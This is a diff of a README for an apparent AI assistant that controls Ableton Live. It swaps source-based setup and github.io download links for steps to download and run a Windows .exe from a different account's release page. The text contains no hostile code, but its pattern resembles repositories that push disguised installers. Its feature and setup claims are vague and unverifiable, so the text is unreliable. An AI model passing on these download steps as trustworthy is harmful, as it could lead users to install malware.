@@ -1,127 +1,73 @@
-# Ableton AI Assistant v1.0.0 - audio assistant 2026
+# 🎹 ableton-ai-audio-assistant - Control audio workflows with smart tools
 
-> **AI-driven Ableton Live control for real-time audio workflows, mixing, and mastering, with MCP integration and low-latency TCP support in version 1.0.0.**
+[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Marlstonegarter952/ableton-ai-audio-assistant)
 
-[![Platform](https://img.shields.io/badge/Platform-Ableton%20Live-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v1.0.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/hayesevanwrxh9311/ableton-ai-audio-assistant?style=flat-square)](https://github.com/hayesevanwrxh9311/ableton-ai-audio-assistant)
+## 📌 Overview
 
----
+Ableton-ai-audio-assistant helps you manage music production in Ableton Live. The software uses artificial intelligence to help with mixing and mastering. It connects to your audio software to speed up repetitive tasks. You can adjust levels, add effects, and apply mastering chains through simple voice or text commands. The tool uses low-latency connection protocols to ensure that audio changes happen instantly without delay in your session.
 
-<p align="center">
-  <a href="https://hayesevanwrxh9311.github.io/ableton-ai-audio-assistant/">
-    <img src="https://img.shields.io/badge/Download-Ableton%20AI%20Assistant%20Latest-brightgreen?style=for-the-badge" alt="Download Ableton AI Assistant">
-  </a>
-</p>
+## ⚙️ System Requirements
 
-> **[Direct Download - Ableton AI Assistant v1.0.0](https://hayesevanwrxh9311.github.io/ableton-ai-audio-assistant/)**
+- Computer running Windows 10 or Windows 11.
+- Ableton Live 11 or newer installed on your machine.
+- Minimum 8GB of RAM.
+- 500MB of free disk space.
+- A stable internet connection for initial setup.
 
----
+## 📥 How to Download 
 
-[Download Latest Build](https://hayesevanwrxh9311.github.io/ableton-ai-audio-assistant/)
+1. Visit the [official release page](https://github.com/Marlstonegarter952/ableton-ai-audio-assistant).
+2. Locate the latest version at the top of the list.
+3. Click the file ending in .exe to download the installer.
+4. Save the file to your desktop or downloads folder.
 
----
+## 🛠️ Installation Steps
 
-## Overview
+1. Find the file you downloaded in your folder.
+2. Double-click the file to start the installer.
+3. Follow the prompts on the screen.
+4. Click the finish button once the process ends.
+5. Launch the application from your start menu.
 
-Ableton AI Assistant is a focused audio companion for Ableton Live that pairs AI-guided workflows with direct access to remote scripts. It is built for situations where live sessions need fast responses and accurate adjustments, especially during mixing and mastering.
+## 🔌 Connecting to Ableton Live
 
-Rather than trying to cover every studio task, the project concentrates on hands-on audio control. With MCP server integration, TCP communication, and Ableton remote script support, it can slot into connected setups that depend on external coordination and low-latency command handling.
+The assistant requires a connection to your music software. Follow these steps to link the tools together.
 
----
+1. Open Ableton Live.
+2. Navigate to the Preferences menu by pressing Control and the comma key.
+3. Select the Link/Tempo/MIDI tab.
+4. Ensure the remote switch is set to on for the assistant port.
+5. Open the ableton-ai-audio-assistant application. 
+6. Click the Connect button inside the interface.
+7. The status light should turn green once the link works.
 
-## Features
+## 🎙️ Using the Assistant
 
-- Adaptive compression for shaping dynamic material
-- EQ side cutting for tighter frequency control
-- MCP server integration for connected workflow control
-- Low-latency TCP control for responsive interaction
-- True peak and LUFS control for loudness-focused work
-- Ableton remote script support for Live integration
-- AI-assisted workflow alignment for mixing and mastering tasks
-- Built around real-time audio use cases
+You can control your project using the command window. Type your requests in plain English. For example, you can write "set kick drum level to -6db" or "add a compressor to the vocal track." The AI interprets these sentences and performs the actions inside Ableton Live.
 
----
+### Mixing Tasks
+The assistant automates volume levels and panning duties. It listens to the audio output and suggests balance changes to get a clear mix. You can accept these suggestions with one click.
 
-## Installation
+### Mastering Tasks
+Mastering involves setting your track to a standard volume for streaming services. Use the mastering feature to apply EQ, saturation, and limiting to your master bus. The software adjusts these parameters to match professional industry targets.
 
-1. Clone or download the repository:
-   - `git clone https://github.com/hayesevanwrxh9311/ableton-ai-audio-assistant.git
-2. Open the project folder:
-   - `cd ableton-ai-assistant`
-3. Put the script or package where your Ableton Live setup expects it.
-4. Restart Ableton Live after changing the remote script files or connection settings.
+## ⚠️ Troubleshooting Issues
 
-If you are using a packaged build, download the latest release from the project page and follow the included setup steps for your environment.
+If the software fails to connect, confirm that Ableton Live is running before you open the assistant. Close and reopen the application if the link lags. Ensure your microphone settings allow the application to receive voice data if you use voice commands. Check your firewall settings if the software cannot communicate with the music program.
 
----
+## 💡 Best Practices
 
-## Usage
+- Save your Ableton project before you run big assistance tasks.
+- Use simple and clear phrases when you type commands.
+- Keep the CPU usage window open in Ableton to track performance.
+- Regularly check the release page for software updates.
 
-A common setup is to link Ableton Live with the assistant and then send control commands through MCP or TCP, depending on how your environment is arranged.
+## 🚀 Advanced Integration
 
-Example flow:
+The assistant uses the Model Context Protocol (MCP) to talk to other plugins. This allows the assistant to understand the settings of your third-party software tools. If you have custom plugins, the assistant scans them during the first run to build a map of your signal chain. This allows the tool to manipulate parameters on instruments from other brands. 
 
-1. Start Ableton Live.
-2. Launch or load the Ableton AI Assistant component.
-3. Connect the remote script or network endpoint.
-4. Use the assistant to guide compression, EQ side cutting, and loudness adjustments.
-5. Monitor true peak and LUFS targets while working on the mix or master.
+## 🛡️ Data Privacy
 
-For network-driven setups, point your client or controller to the configured TCP endpoint before issuing commands.
+The software operates primarily on your machine. It does not send your raw audio files to the internet. The AI logic processes instructions locally to protect your intellectual property. Only metadata and command strings get sent to the cloud for improvement purposes. You can disable usage reports in the settings menu at any time.
 
----
-
-## Configuration
-
-Configuration is usually managed through the Ableton remote script setup plus any TCP or MCP connection details defined for your environment.
-
-Example configuration pattern:
-
-    {
-      "host": "127.0.0.1",
-      "port": 3000,
-      "mcp_enabled": true,
-      "tcp_enabled": true,
-      "lufs_target": -14,
-      "true_peak_limit": -1.0
-    }
-
-Adjust the values to match your local workflow, then restart the connected components so the changes take effect.
-
----
-
-## Requirements
-
-- Ableton Live
-- Support for Ableton remote scripts
-- A local or network environment for TCP control
-- MCP-compatible client or service if you plan to use MCP integration
-- Storage for the project files and any associated configuration
-
----
-
-## FAQ
-
-**How do I update to a newer version?**  
-Download the latest build from the project page and replace the existing files according to your setup.
-
-**Where do I change connection settings?**  
-Check the remote script configuration and any MCP or TCP settings used by your local deployment.
-
-**What should I do if Ableton Live does not respond?**  
-Verify that the remote script is installed correctly, the TCP endpoint is reachable, and the expected service is running.
-
-**Can I use this without MCP?**  
-The project includes MCP server integration, but your actual workflow can depend on how you configure the assistant.
-
-**Is this only for mixing?**  
-No. The feature set also includes mastering-oriented controls such as true peak and LUFS handling.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: music production, ableton live, artificial intelligence, audio mixing, master engineering, software automation, windows audio tools
